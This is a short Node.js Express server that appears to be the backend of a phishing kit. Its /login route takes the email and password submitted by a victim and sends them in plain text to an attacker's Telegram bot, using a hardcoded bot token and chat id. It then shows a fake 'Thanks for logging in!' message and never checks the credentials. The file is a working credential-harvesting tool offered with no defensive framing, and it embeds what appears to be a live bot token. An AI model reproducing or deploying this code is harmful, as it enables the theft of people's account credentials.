const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
const app = express();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("."));

app.post("/login", async (req, res) => {
  const { email, pass } = req.body;
  const log = `Email: ${email}, Pass: ${pass}`;

  // Telegram config
  const botToken = '7718309113:AAHykcUptXULSFnQfBnRhPZt5A7pCi5i9mE';
  const userId = '7629121448';
  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    await axios.post(telegramUrl, {
      chat_id: userId,
      text: `🔐 New login attempt:\n${log}`
    });
  } catch (err) {
    console.error("Telegram Error:", err.message);
  }

  res.send("Thanks for logging in!");
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
